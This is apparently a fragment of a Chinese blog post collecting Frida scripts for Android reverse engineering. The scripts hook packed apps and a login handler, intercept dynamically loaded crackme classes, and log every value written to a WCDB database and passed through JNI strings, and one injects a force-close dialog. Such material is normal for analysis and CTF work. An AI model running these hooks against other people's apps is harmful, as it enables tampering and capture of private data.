b&#39;YWRtaW46MTIzMTIzJw&#x3D;&#x3D;&#39;</span><br><span class="line">Modified data sent</span><br><span class="line">string_to_recv: b&#39;YWRtaW46MTIzMTIzJw&#x3D;&#x3D;&#39;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">YWRtaW46MTIzMTIzJw&#x3D;&#x3D;   admin:123123&#39;</span><br></pre></td></tr></table></figure><h2 id="API-List"><a href="#API-List" class="headerlink" title="API List"></a>API List</h2><ul><li><code>Java.choose(className: string, callbacks: Java.ChooseCallbacks): void</code><br>通过扫描Java VM的堆来枚举className类的live instance。</li><li><code>Java.use(className: string): Java.Wrapper&lt;&#123;&#125;&gt;</code><br>动态为className生成JavaScript Wrapper，可以通过调用<code>$new()</code>来调用构造函数来实例化对象。<br>在实例上调用<code>$dispose()</code>以对其进行显式清理，或者等待JavaScript对象被gc。 </li><li><code>Java.perform(fn: () =&gt; void): void</code><br>Function to run while attached to the VM.<br>Ensures that the current thread is attached to the VM and calls fn. (This isn’t necessary in callbacks from Java.)<br>Will defer calling fn if the app’s class loader is not available yet. Use Java.performNow() if access to the app’s classes is not needed.</li><li><code>send(message: any, data?: ArrayBuffer | number[]): void</code><br>任何JSON可序列化的值。<br>将JSON序列化后的message发送到您的基于Frida的应用程序，并包含(可选)一些原始二进制数据。<br>The latter is useful if you e.g. dumped some memory using NativePointer#readByteArray().</li><li><code>recv(callback: MessageCallback): MessageRecvOperation</code><br>Requests callback to be called on the next message received from your Frida-based application.<br>This will only give you one message, so you need to call recv() again to receive the next one.</li><li><code>wait(): void</code><br>堵塞，直到message已经receive并且callback已经执行完毕并返回</li></ul><h2 id="更新中。。。"><a href="#更新中。。。" class="headerlink" title="更新中。。。"></a>更新中。。。</h2><h1 id="Android-加固应用Hook方式-Frida"><a href="#Android-加固应用Hook方式-Frida" class="headerlink" title="Android 加固应用Hook方式-Frida"></a>Android 加固应用Hook方式-Frida</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function () &#123;</span><br><span class="line">    var application &#x3D; Java.use(&#39;android.app.Application&#39;);</span><br><span class="line"></span><br><span class="line">    application.attach.overload(&#39;android.content.Context&#39;).implementation &#x3D; function(context)&#123;</span><br><span class="line"></span><br><span class="line">        var result &#x3D; this.attach(context);</span><br><span class="line">        var classloader &#x3D; context.getClassLoader();</span><br><span class="line">        Java.classFactory.loader &#x3D; classloader;</span><br><span class="line"></span><br><span class="line">        var yeyoulogin &#x3D; Java.classFactory.use(&#39;com.zcm.主窗口&#39;);</span><br><span class="line">        console.log(&quot;yeyoulogin:&quot;+ yeyoulogin);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        yeyoulogin.按钮_用户登录$被单击.implementation &#x3D; function(arg)&#123;</span><br><span class="line">            console.log(&quot;retval:&quot;+ this.返回值);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>列出加载的类</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.enumerateLoadedClasses(</span><br><span class="line">  &#123;</span><br><span class="line">  &quot;onMatch&quot;: function(className)&#123; </span><br><span class="line">        console.log(className) </span><br><span class="line">    &#125;,</span><br><span class="line">  &quot;onComplete&quot;:function()&#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="Hook-动态加载类"><a href="#Hook-动态加载类" class="headerlink" title="Hook 动态加载类"></a>Hook 动态加载类</h1><h2 id="获取构造函数的参数"><a href="#获取构造函数的参数" class="headerlink" title="获取构造函数的参数"></a>获取构造函数的参数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        &#x2F;&#x2F;创建一个DexClassLoader的wapper</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        &#x2F;&#x2F;hook 它的构造函数$init，我们将它的四个参数打印出来看看。</span><br><span class="line">        dexclassLoader.$init.implementation &#x3D; function(dexPath,optimizedDirectory,librarySearchPath,parent)&#123;</span><br><span class="line">            console.log(&quot;dexPath:&quot;+dexPath);</span><br><span class="line">            console.log(&quot;optimizedDirectory:&quot;+optimizedDirectory);</span><br><span class="line">            console.log(&quot;librarySearchPath:&quot;+librarySearchPath);</span><br><span class="line">            console.log(&quot;parent:&quot;+parent);</span><br><span class="line">            &#x2F;&#x2F;不破换它原本的逻辑，我们调用它原本的构造函数。</span><br><span class="line">          this.$init(dexPath,optimizedDirectory,librarySearchPath,parent);</span><br><span class="line">        &#125;</span><br><span class="line">        console.log(&quot;down!&quot;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="获取动态加载的类"><a href="#获取动态加载的类" class="headerlink" title="获取动态加载的类"></a>获取动态加载的类</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line"></span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">           &#x2F;&#x2F;定义一个String变量，指定我们需要的类</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            &#x2F;&#x2F;直接调用第二个重载方法，跟原本的逻辑相同。</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line">            &#x2F;&#x2F;如果loadClass的name参数和我们想要hook的类名相同</span><br><span class="line">            if(name &#x3D;&#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                &#x2F;&#x2F;则拿到它的值</span><br><span class="line">                hookClass &#x3D; result;</span><br><span class="line">                &#x2F;&#x2F;打印hookClass变量的值</span><br><span class="line">                console.log(hookClass);</span><br><span class="line">                send(hookClass);</span><br><span class="line">                return result;</span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>通过Java.cast处理泛型方法(JAVA中Class&lt;?&gt;表示泛型)，在调用动态加载方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var constructorclass &#x3D; Java.use(&quot;java.lang.reflect.Constructor&quot;);</span><br><span class="line">        var objectclass&#x3D; Java.use(&quot;java.lang.Object&quot;);</span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line"></span><br><span class="line">            if(name &#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                var hookClass &#x3D; result;</span><br><span class="line">                console.log(&quot;------------------------------CAST--------------------------------&quot;)</span><br><span class="line">                &#x2F;&#x2F;类型转换</span><br><span class="line">                var hookClassCast &#x3D; Java.cast(hookClass,ClassUse);</span><br><span class="line">                &#x2F;&#x2F;调用getMethods()获取类下的所有方法</span><br><span class="line">                var methods &#x3D; hookClassCast.getMethods();</span><br><span class="line">                console.log(methods);</span><br><span class="line">                console.log(&quot;-----------------------------NOT CAST-----------------------------&quot;)</span><br><span class="line">                &#x2F;&#x2F;未进行类型转换，看看能否调用getMethods()方法</span><br><span class="line">                var methodtest &#x3D; hookClass.getMethods();</span><br><span class="line">                console.log(methodtest);</span><br><span class="line">                console.log(&quot;---------------------OVER------------------------&quot;)</span><br><span class="line">                return result;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>利用getDeclaredConstructor()获取具有指定参数列表构造函数的Constructor 并实例化</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line">        var objectclass&#x3D; Java.use(&quot;java.lang.Object&quot;);</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var orininclass &#x3D; Java.use(&quot;cn.chaitin.geektan.crackme.MainActivity&quot;);</span><br><span class="line">        var Integerclass &#x3D; Java.use(&quot;java.lang.Integer&quot;);</span><br><span class="line">        &#x2F;&#x2F;实例化MainActivity对象</span><br><span class="line">        var mainAc &#x3D; orininclass.$new();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line"></span><br><span class="line">            if(name &#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                var hookClass &#x3D; result;</span><br><span class="line">                var hookClassCast &#x3D; Java.cast(hookClass,ClassUse);</span><br><span class="line">                console.log(&quot;-----------------------------BEGIN-------------------------------------&quot;);</span><br><span class="line">                &#x2F;&#x2F;获取构造器</span><br><span class="line">                var ConstructorParam &#x3D;Java.array(&#39;Ljava.lang.Object;&#39;,[objectclass.class]);</span><br><span class="line">                var Constructor &#x3D; hookClassCast.getDeclaredConstructor(ConstructorParam);</span><br><span class="line">                console.log(&quot;Constructor:&quot;+Constructor);</span><br><span class="line">                console.log(&quot;orinin:&quot;+mainAc);</span><br><span class="line">                &#x2F;&#x2F;实例化，newInstance的参数也是Ljava.lang.Object;</span><br><span class="line">                var instance &#x3D; Constructor.newInstance([mainAc]);</span><br><span class="line">                console.log(&quot;patchAc:&quot;+instance);</span><br><span class="line">                send(instance);</span><br><span class="line">console.log(&quot;--------------------------------------------------------------------&quot;);</span><br><span class="line">                return result;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>利用getDeclaredMethods()，获取本类中的所有方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line">        var objectclass&#x3D; Java.use(&quot;java.lang.Object&quot;);</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var orininclass &#x3D; Java.use(&quot;cn.chaitin.geektan.crackme.MainActivity&quot;);</span><br><span class="line">        var Integerclass &#x3D; Java.use(&quot;java.lang.Integer&quot;);</span><br><span class="line">        &#x2F;&#x2F;实例化MainActivity对象</span><br><span class="line">        var mainAc &#x3D; orininclass.$new();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line"></span><br><span class="line">            if(name &#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                var hookClass &#x3D; result;</span><br><span class="line">                var hookClassCast &#x3D; Java.cast(hookClass,ClassUse);</span><br><span class="line">                console.log(&quot;-----------------------------BEGIN-------------------------------------&quot;);</span><br><span class="line">                &#x2F;&#x2F;获取构造器</span><br><span class="line">                var ConstructorParam &#x3D;Java.array(&#39;Ljava.lang.Object;&#39;,[objectclass.class]);</span><br><span class="line">                var Constructor &#x3D; hookClassCast.getDeclaredConstructor(ConstructorParam);</span><br><span class="line">                console.log(&quot;Constructor:&quot;+Constructor);</span><br><span class="line">                console.log(&quot;orinin:&quot;+mainAc);</span><br><span class="line">                &#x2F;&#x2F;实例化，newInstance的参数也是Ljava.lang.Object;</span><br><span class="line">                var instance &#x3D; Constructor.newInstance([mainAc]);</span><br><span class="line">                console.log(&quot;MainActivityPatchInstance:&quot;+instance);</span><br><span class="line">                send(instance);</span><br><span class="line">                console.log(&quot;----------------------------Methods---------------------------------&quot;);</span><br><span class="line">                var func &#x3D; hookClassCast.getDeclaredMethods();</span><br><span class="line">                console.log(func);</span><br><span class="line">                console.log(&quot;--------------------------Need Method---------------------------------&quot;);</span><br><span class="line">                console.log(func[0]);</span><br><span class="line">                var f &#x3D; func[0];</span><br><span class="line">                console.log(&quot;---------------------------- OVER---------------------------------&quot;);</span><br><span class="line">                return result;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>调用Method.invoke()去执行方法(invoke方法的第一个参数是执行这个方法的对象实例，第二个参数是带入的实际值数组，返回值是Object，也既是该方法执行后的返回值)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f.invoke(instance,Array);</span><br></pre></td></tr></table></figure><p>read-std-string</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * Note: Only compatible with libc++, though libstdc++&#39;s std::string is a lot simpler.</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">function readStdString (str) &#123;</span><br><span class="line">  const isTiny &#x3D; (str.readU8() &amp; 1) &#x3D;&#x3D;&#x3D; 0;</span><br><span class="line">  if (isTiny) &#123;</span><br><span class="line">    return str.add(1).readUtf8String();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return str.add(2 * Process.pointerSize).readPointer().readUtf8String();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>whereisnative</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function() &#123;</span><br><span class="line"></span><br><span class="line">    var SystemDef &#x3D; Java.use(&#39;java.lang.System&#39;);</span><br><span class="line"></span><br><span class="line">    var RuntimeDef &#x3D; Java.use(&#39;java.lang.Runtime&#39;);</span><br><span class="line"></span><br><span class="line">    var exceptionClass &#x3D; Java.use(&#39;java.lang.Exception&#39;);</span><br><span class="line"></span><br><span class="line">    var SystemLoad_1 &#x3D; SystemDef.load.overload(&#39;java.lang.String&#39;);</span><br><span class="line"></span><br><span class="line">    var SystemLoad_2 &#x3D; SystemDef.loadLibrary.overload(&#39;java.lang.String&#39;);</span><br><span class="line"></span><br><span class="line">    var RuntimeLoad_1 &#x3D; RuntimeDef.load.overload(&#39;java.lang.String&#39;);</span><br><span class="line"></span><br><span class="line">    var RuntimeLoad_2 &#x3D; RuntimeDef.loadLibrary.overload(&#39;java.lang.String&#39;);</span><br><span class="line"></span><br><span class="line">    var ThreadDef &#x3D; Java.use(&#39;java.lang.Thread&#39;);</span><br><span class="line"></span><br><span class="line">    var ThreadObj &#x3D; ThreadDef.$new();</span><br><span class="line"></span><br><span class="line">    SystemLoad_1.implementation &#x3D; function(library) &#123;</span><br><span class="line">        send(&quot;Loading dynamic library &#x3D;&gt; &quot; + library);</span><br><span class="line">        stackTrace();</span><br><span class="line">        return SystemLoad_1.call(this, library);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SystemLoad_2.implementation &#x3D; function(library) &#123;</span><br><span class="line">        send(&quot;Loading dynamic library &#x3D;&gt; &quot; + library);</span><br><span class="line">        stackTrace();</span><br><span class="line">        SystemLoad_2.call(this, library);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    RuntimeLoad_1.implementation &#x3D; function(library) &#123;</span><br><span class="line">        send(&quot;Loading dynamic library &#x3D;&gt; &quot; + library);</span><br><span class="line">        stackTrace();</span><br><span class="line">        RuntimeLoad_1.call(this, library);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    RuntimeLoad_2.implementation &#x3D; function(library) &#123;</span><br><span class="line">        send(&quot;Loading dynamic library &#x3D;&gt; &quot; + library);</span><br><span class="line">        stackTrace();</span><br><span class="line">        RuntimeLoad_2.call(this, library);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function stackTrace() &#123;</span><br><span class="line">        var stack &#x3D; ThreadObj.currentThread().getStackTrace();</span><br><span class="line">        for (var i &#x3D; 0; i &lt; stack.length; i++) &#123;</span><br><span class="line">            send(i + &quot; &#x3D;&gt; &quot; + stack[i].toString());</span><br><span class="line">        &#125;</span><br><span class="line">        send(&quot;--------------------------------------------------------------------------&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;)；</span><br></pre></td></tr></table></figure><p>Non-ASCII</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int ֏(int x) &#123;</span><br><span class="line">       return x + 100;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>甚至有一些不可视, 所以可以先编码打印出来, 再用编码后的字符串去 hook.&lt;\br&gt;</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(</span><br><span class="line">        function x() &#123;</span><br><span class="line"></span><br><span class="line">            var targetClass &#x3D; &quot;com.example.hooktest.MainActivity&quot;;</span><br><span class="line"></span><br><span class="line">            var hookCls &#x3D; Java.use(targetClass);</span><br><span class="line">            var methods &#x3D; hookCls.class.getDeclaredMethods();</span><br><span class="line"></span><br><span class="line">            for (var i in methods) &#123;</span><br><span class="line">                console.log(methods[i].toString());</span><br><span class="line">                console.log(encodeURIComponent(methods[i].toString().replace(&#x2F;^.*?\.([^\s\.\(\)]+)\(.*?$&#x2F;, &quot;$1&quot;)));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            hookCls[decodeURIComponent(&quot;%D6%8F&quot;)]</span><br><span class="line">                .implementation &#x3D; function (x) &#123;</span><br><span class="line">                    console.log(&quot;original call: fun(&quot; + x + &quot;)&quot;);</span><br><span class="line">                    var result &#x3D; this[decodeURIComponent(&quot;%D6%8F&quot;)](900);</span><br><span class="line">                    return result;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><h2 id="Hook-数据库"><a href="#Hook-数据库" class="headerlink" title="Hook 数据库"></a>Hook 数据库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var SQLiteDatabase &#x3D; Java.use(&#39;com.tencent.wcdb.database.SQLiteDatabase&#39;);</span><br><span class="line">    var Set &#x3D; Java.use(&quot;java.util.Set&quot;);</span><br><span class="line">    var ContentValues &#x3D; Java.use(&quot;android.content.ContentValues&quot;);</span><br><span class="line">    SQLiteDatabase.insert.implementation &#x3D; function (arg1,arg2,arg3) &#123;</span><br><span class="line"></span><br><span class="line">        this.insert.call(this, arg1, arg2, arg3);</span><br><span class="line">        console.log(&quot;[insert] -&gt; arg1:&quot; + arg1 + &quot;\t arg2:&quot; + arg2);</span><br><span class="line">        var values &#x3D; Java.cast(arg3, ContentValues);</span><br><span class="line">        var sets &#x3D; Java.cast(values.keySet(), Set);</span><br><span class="line">        </span><br><span class="line">        var arr &#x3D; sets.toArray().toString().split(&quot;,&quot;);</span><br><span class="line">        for (var i &#x3D; 0; i &lt; arr.length; i++)&#123;</span><br><span class="line">            console.log(&quot;[insert] -&gt; key:&quot; + arr[i] + &quot;\t value:&quot; + values.get(arr[i]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><h2 id="Hook-JNI-Native-GetStringUTFChars"><a href="#Hook-JNI-Native-GetStringUTFChars" class="headerlink" title="Hook JNI Native GetStringUTFChars"></a>Hook JNI Native GetStringUTFChars</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function hook_native_GetStringUTFChars() &#123;</span><br><span class="line">    var env &#x3D; Java.vm.getEnv();</span><br><span class="line">    var handlePointer &#x3D; Memory.readPointer(env.handle);</span><br><span class="line">    console.log(&quot;env handle: &quot; + handlePointer);</span><br><span class="line">    var GetStringUTFCharsPtr &#x3D; Memory.readPointer(handlePointer.add(0x2A4));</span><br><span class="line">    console.log(&quot;GetStringUTFCharsPtr addr: &quot; + GetStringUTFCharsPtr);</span><br><span class="line">    Interceptor.attach(GetStringUTFCharsPtr, &#123;</span><br><span class="line">        onEnter: function (args) &#123;</span><br><span class="line">            var str &#x3D; &quot;&quot;;</span><br><span class="line">            Java.perform(function () &#123;</span><br><span class="line">                str &#x3D; Java.cast(args[1], Java.use(&#39;java.lang.String&#39;));</span><br><span class="line">            &#125;);</span><br><span class="line">            console.log(&quot;GetStringUTFChars: &quot; + str);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主动弹窗</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function() &#123;</span><br><span class="line">    var System &#x3D; Java.use(&#39;java.lang.System&#39;);</span><br><span class="line">    var ActivityThread &#x3D; Java.use(&quot;android.app.ActivityThread&quot;);</span><br><span class="line">    var AlertDialogBuilder &#x3D; Java.use(&quot;android.app.AlertDialog$Builder&quot;);</span><br><span class="line">    var DialogInterfaceOnClickListener &#x3D; Java.use(&#39;android.content.DialogInterface$OnClickListener&#39;);</span><br><span class="line"></span><br><span class="line">    Java.use(&quot;android.app.Activity&quot;).onCreate.overload(&quot;android.os.Bundle&quot;).implementation &#x3D; function(savedInstanceState) &#123;</span><br><span class="line">        var currentActivity &#x3D; this;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Get Main Activity</span><br><span class="line">        var application &#x3D; ActivityThread.currentApplication();</span><br><span class="line">        var launcherIntent &#x3D; application.getPackageManager().getLaunchIntentForPackage(application.getPackageName());</span><br><span class="line">        var launchActivityInfo &#x3D; launcherIntent.resolveActivityInfo(application.getPackageManager(), 0);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Alert Will Only Execute On Main Package Activity Creation</span><br><span class="line">        console.log(this.getComponentName().getClassName())</span><br><span class="line">        &#x2F;**</span><br><span class="line">         * non protective application</span><br><span class="line">         * if (launchActivityInfo &#x3D;&#x3D;&#x3D; this.getComponentName().getClassName()) &#123;</span><br><span class="line">         *     ...</span><br><span class="line">         * &#125;</span><br><span class="line">         *&#x2F;</span><br><span class="line"></span><br><span class="line">        if (this.getComponentName().getClassName() &#x3D;&#x3D;&#x3D; &quot;com.xxx&quot;) &#123;</span><br><span class="line"></span><br><span class="line">            var alert &#x3D; AlertDialogBuilder.$new(this);</span><br><span class="line">            var jString &#x3D; Java.use(&#39;java.lang.String&#39;);</span><br><span class="line">            var CharSequence &#x3D; Java.use(&#39;java.lang.CharSequence&#39;);</span><br><span class="line">            var charSequence &#x3D; Java.cast(jString.$new(&quot;What you want to do now?&quot;), CharSequence);</span><br><span class="line">            var charSequence1 &#x3D; Java.cast(jString.$new(&quot;Dismiss&quot;), CharSequence);</span><br><span class="line">            var charSequence2 &#x3D; Java.cast(jString.$new(&quot;Force Close!&quot;), CharSequence);</span><br><span class="line">            alert.setMessage(charSequence);</span><br><span class="line"></span><br><span class="line">            alert.setPositiveButton(charSequence1, Java.registerClass(&#123;</span><br><span class="line">                name: &#39;il.co.realgame.OnClickListenerPositive&#39;,</span><br><span class="line">                implements: [DialogInterfaceOnClickListener],</span><br><span class="line">                methods: &#123;</span><br><span class="line">                    getName: function() &#123;</span><br><span class="line">                        return &#39;OnClickListenerPositive&#39;;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    onClick: function(dialog, which) &#123;</span><br><span class="line">                        &#x2F;&#x2F; Dismiss</span><br><span class="line">                        dialog.dismiss();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).$new());</span><br><span class="line"></span><br><span class="line">            alert.setNegativeButton(charSequence2, Java.registerClass(&#123;</span><br><span class="line">                name: &#39;il.co.realgame.OnClickListenerNegative&#39;,</span><br><span class="line">                implements: [DialogInterfaceOnClickListener],</span><br><span class="line">                methods: &#123;</span><br><span class="line">                    getName: function() &#123;</span><br><span class="line">                        return &#39;OnClickListenerNegative&#39;;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    onClick: function(dialog, which) &#123;</span><br><span class="line">                        &#x2F;&#x2F; Close Application</span><br><span class="line">                        &#x2F;&#x2F;currentActivity.finish();</span><br><span class="line">                        System.exit(0);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).$new());</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; Create Alert</span><br><span class="line">            alert.create().show();</span><br><span class="line">        &#125;</span><br><span class="line">        return this.onCreate.overload(&quot;android.os.Bundle&quot;).call(this, savedInstanceState);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="Hook-prettyMethod"><a href="#Hook-prettyMethod" class="headerlink" title="Hook prettyMethod"></a>Hook prettyMethod</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const STD_STRING_SIZE &#x3D; 3 * Process.pointerSize;</span><br><span class="line">class StdString &#123;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        this.handle &#x3D; Memory.alloc(STD_STRING_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dispose() &#123;</span><br><span class="line">        const [data, isTiny] &#x3D; this._getData();</span><br><span class="line">        if (!isTiny) &#123;</span><br><span class="line">            Java.api.$delete(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    disposeToString() &#123;</span><br><span class="line">        const result &#x3D; this.toString();</span><br><span class="line">        this.dispose();</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    toString() &#123;</span><br><span class="line">        const [data] &#x3D; this._getData();</span><br><span class="line">        return data.readUtf8String();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _getData() &#123;</span><br><span class="line">        const str &#x3D; this.handle;</span><br><span class="line">        const isTiny &#x3D; (str.readU8() &amp; 1) &#x3D;&#x3D;&#x3D; 0;</span><br><span class="line">        const data &#x3D; isTiny ? str.add(1) : str.add(2 * Process.pointerSize).readPointer();</span><br><span class="line">        return [data, isTiny];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function prettyMethod(method_id, withSignature) &#123;</span><br><span class="line">    const result &#x3D; new StdString();</span><br><span class="line">    Java.api[&#39;art::ArtMethod::PrettyMethod&#39;](result, method_id, withSignature ? 1 : 0);</span><br><span class="line">    return result.disposeToString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://eternalsakura13.com/2020/07/04/frida/#more">https://eternalsakura13.com/2020/07/04/frida/#more</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Frida-常用操作总结&quot;&gt;&lt;a href=&quot;#Frida-常用操作总结&quot; class=&quot;headerlink&quot; title=&quot;Frida 常用操作总结&quot;&gt;&lt;/a&gt;Frida 常用操作总结&lt;/h1&gt;&lt;h2 id=&quot;Frida环境&quot;&gt;&lt;a href=&quot;#Frida环境&quot; class=&quot;headerlink&quot; title=&quot;Frida环境&quot;&gt;&lt;/a&gt;Frida环境&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/frida/frida&quot;&gt;https://github.com/frida/frida&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Pyenv&quot;&gt;&lt;a href=&quot;#Pyenv&quot; class=&quot;headerlink&quot; title=&quot;Pyenv&quot;&gt;&lt;/a&gt;Pyenv&lt;/h2&gt;&lt;p&gt;python全版本随机切换，这里提供&lt;a href=&quot;https://github.com/pyenv/pyenv#homebrew-on-macos&quot;&gt;macOS上的配置方法&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Frida安装&quot;&gt;&lt;a href=&quot;#Frida安装&quot; class=&quot;headerlink&quot; title=&quot;Frida安装&quot;&gt;&lt;/a&gt;Frida安装&lt;/h2&gt;&lt;p&gt;如果直接按下述安装则会直接安装frida和frida-tools的最新版本。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pip install frida-tools&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;frida --version&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;frida-ps --version&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;我们也可以自由安装旧版本的frida，例如12.8.0&lt;/p&gt;
